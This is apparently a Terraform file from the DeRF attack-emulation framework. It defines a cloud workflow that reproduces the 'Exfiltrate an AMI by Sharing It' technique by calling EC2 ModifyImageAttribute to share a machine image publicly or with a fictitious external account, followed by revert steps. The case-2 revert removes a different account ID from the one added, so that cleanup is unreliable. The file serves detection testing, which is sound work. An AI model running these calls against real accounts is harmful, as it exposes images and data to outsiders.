data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}

data "aws_region" "current" {}

resource "google_workflows_workflow" "workflow_to_invoke_aws_ec2_ami_share_snapshot_attack" {
  name            = "aws-ec2-ami-share-snapshot-srt"
  description     = "A  workflow intended to match the functionality of the Status Red Team attack technique 'Exfiltrate an AMI by Sharing It': https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.ec2-share-ami/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################

## This attack has two 'cases' - two different ways to share a the EC2 AMI Snapshot externally. 
## The first option shares an AMI snapshot with {"groups":"all"} - everyone.
## The second case shares an AMI Snapshot with an external, fictitious AWS account, (012345678912)

## Cleanup
# The workflow finally reverts the modification of the snapshot attributes, with the default user.

#####################################################################################
## Input
######################################################################################
# Sharing the AMI with group:all
##### INPUT: {"case":"1","user":"user01"}
##### INPUT: {"case":"1","user":"user02"}

# Sharing the AMI with an external fictitious account
##### INPUT: {"case":"2","user":"user01"}
##### INPUT: {"case":"2","user":"user02"}


######################################################################################
## User Agent
######################################################################################
#### Workflow executes with the User-Agent string: "Derf-AWS-EC2-AMI-Share-Snapshot-WORKFLOWEXECUTIONID"



######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
          - case: $${args.case}
          - user: $${args.user}
          - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}  
    - getCloudRunURL:
        call: googleapis.run.v2.projects.locations.services.get
        args:
          name: '$${"projects/"+projectID+"/locations/us-central1/services/aws-proxy-app"}'
        result: appEndpoint 
    - determineCase:
        call: determineCase
        args:
            case: $${case}
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: response 
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
determineCase:
  params: [case, user, appEndpoint]
  steps:
    - determineCase:
        switch:
        - condition: $${case == "1"}
          steps:
              - 1:
                  call: Case1
                  args:
                      user: $${user}
                      appEndpoint: $${appEndpoint}
                  result: response
              - 1revert:
                  call: Revert1
                  args:
                      appEndpoint: $${appEndpoint}
                  result: revertResponse
              - 1-returnOutput:
                  return: $${response}

        - condition: $${case == "2"}
          steps:
              - 2:
                  call: Case2
                  args:
                      user: $${user}
                      appEndpoint: $${appEndpoint}
                  result: response
              - 2revert:
                  call: Revert2
                  args:
                      appEndpoint: $${appEndpoint}
                  result: revertResponse
              - 2-returnOutput:
                  return: $${response}

        - condition: $${not(case == "2")}
          return: "invalid case"

Case1:
  params: [user, appEndpoint]
  steps:  
    - ModifyImageAttribute:
        try:
            steps:
                - callModifyImageAttribute:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                          User-Agent: "DeRF-Workflow-Attack-Technique"
                      body:
                          HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                          REGION: ${data.aws_region.current.name}
                          SERVICE: "ec2" 
                          ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
                          BODY: "Action=ModifyImageAttribute&Version=2016-11-15&ImageId=${aws_ami.ami.id}&LaunchPermission.Add.1.Group=all"
                          UA: '$${"Derf-AWS-EC2-AMI-Share-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          USER: $${user}
                          VERB: POST
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 404}
                        raise: $${response}
                      - condition: $${response.body.responseCode == 400}
                        raise: $${response}
                    
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: MissingAuthenticationToken
          - condition: $${response.body.responseCode == 404}
            next: cantFind
          - condition: $${response.body.responseCode == 400}
            next: InvalidAMIID

    - MissingAuthenticationToken:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE (Case 1) - The User you passed is not valid - First deprovision the user, then re-provision - try again"

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS (Case 1) - DeRF Share EC2 AMI Snapshot Externally Attack Technique"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE (Case 1) - DeRF Share EC2 AMI Snapshot Externally Attack Technique | This is typically a permission error"
    - cantFind:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE (Case 1) -  DeRF Share EC2 AMI Snapshot Externally Attack Technique | Can't find snapshot - something wrong with the perpetual range infrastructure"
    - InvalidAMIID:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE (Case 1) -  DeRF Share EC2 AMI Snapshot Externally Attack Technique | Invalid snapshot state or wrong AMI Id"


Case2:
  params: [user, appEndpoint]
  steps:  
    - ModifyImageAttribute:
        try:
            steps:
                - callModifyImageAttribute:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                          User-Agent: "DeRF-Workflow-Attack-Technique"
                      body:
                          HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                          REGION: ${data.aws_region.current.name}
                          SERVICE: "ec2" 
                          ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
                          BODY: "Action=ModifyImageAttribute&Version=2016-11-15&ImageId=${aws_ami.ami.id}&LaunchPermission.Add.1.UserId=012345678912"
                          UA: '$${"Derf-AWS-EC2-AMI-Share-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          USER: $${user}
                          VERB: POST
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 404}
                        raise: $${response}
                      - condition: $${response.body.responseCode == 400}
                        raise: $${response}
                    
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: MissingAuthenticationToken
          - condition: $${response.body.responseCode == 404}
            next: cantFind
          - condition: $${response.body.responseCode == 400}
            next: InvalidAMIID

    - MissingAuthenticationToken:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE (Case 2) - The User you passed is not valid - First deprovision the user, then re-provision - try again"

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS (Case 2) - DeRF Share EC2 AMI Snapshot Externally Attack Technique"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE (Case 2) - DeRF Share EC2 AMI Snapshot Externally Attack Technique | This is typically a permission error"
    - cantFind:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE (Case 2)-  DeRF Share EC2 AMI Snapshot Externally Attack Technique | Can't find snapshot - something wrong with the perpetual range infrastructure"
    - InvalidAMIID:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE (Case 2) -  DeRF Share EC2 AMI Snapshot Externally Attack Technique | Invalid snapshot state or wrong AMI Id"

####### Revert the changes to AMI Attributes - Case 1 ########

Revert1:
  params: [appEndpoint]
  steps:  
    - RevertModifyImageAttribute:
        try:
            steps:
                - callModifySnapshotAttribute:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                          User-Agent: "DeRF-Workflow-Attack-Technique"
                      body:
                          HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                          REGION: ${data.aws_region.current.name}
                          SERVICE: "ec2" 
                          ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
                          BODY: "Action=ModifyImageAttribute&Version=2016-11-15&ImageId=${aws_ami.ami.id}&LaunchPermission.Remove.1.Group=all"
                          UA: 'AWS-EC2-AMI-Share-Snapshot-Revert'
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          VERB: POST
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 404}
                        raise: $${response}
                      - condition: $${response.body.responseCode == 400}
                        raise: $${response}
                    
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: MissingAuthenticationToken
          - condition: $${response.body.responseCode == 404}
            next: cantFind
          - condition: $${response.body.responseCode == 400}
            next: InvalidAMIID

    - MissingAuthenticationToken:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - The User you passed is not valid - First deprovision the user, then re-provision - try again"

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - DeRF Share EC2 AMI Snapshot Externally Attack Technique > Changes reverted"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - DeRF Share EC2 AMI Snapshot Externally Attack Technique | This is typically a permission error"
    - cantFind:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE -  DeRF Share EC2 AMI Snapshot Externally Attack Technique | Can't find snapshot - something wrong with the perpetual range infrastructure"
    - InvalidAMIID:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE -  DeRF Share EC2 AMI Snapshot Externally Attack Technique | Invalid snapshot state or wrong AMI Id"

####### Revert the changes to AMI Attributes - Case 2 ########

Revert2:
  params: [appEndpoint]
  steps:  
    - RevertModifyImageAttribute:
        try:
            steps:
                - callModifySnapshotAttribute:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                          User-Agent: "DeRF-Workflow-Attack-Technique"
                      body:
                          HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                          REGION: ${data.aws_region.current.name}
                          SERVICE: "ec2" 
                          ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
                          BODY: "Action=ModifyImageAttribute&Version=2016-11-15&ImageId=${aws_ami.ami.id}&LaunchPermission.Remove.1.UserId=123456789012"
                          UA: 'AWS-EC2-AMI-Share-Snapshot-Revert'
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          VERB: POST
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 404}
                        raise: $${response}
                      - condition: $${response.body.responseCode == 400}
                        raise: $${response}
                    
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: MissingAuthenticationToken
          - condition: $${response.body.responseCode == 404}
            next: cantFind
          - condition: $${response.body.responseCode == 400}
            next: InvalidAMIID

    - MissingAuthenticationToken:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - The User you passed is not valid - First deprovision the user, then re-provision - try again"

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - DeRF Share EC2 AMI Snapshot Externally Attack Technique > Changes reverted"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - DeRF Share EC2 AMI Snapshot Externally Attack Technique | This is typically a permission error"
    - cantFind:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE -  DeRF Share EC2 AMI Snapshot Externally Attack Technique | Can't find snapshot - something wrong with the perpetual range infrastructure"
    - InvalidAMIID:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE -  DeRF Share EC2 AMI Snapshot Externally Attack Technique | Invalid snapshot state or wrong AMI Id"



custom_predicate:
  params: [response]
  steps:
    - what_to_repeat:
        switch:
          - condition: $${response.body.responseCode == 400}
            return: true
          - condition: $${response.body.responseCode == 409}
            return: true
          - condition: $${response.body.responseCode == 500}
            return: true
    - otherwise:
        return: false
        

  EOF

}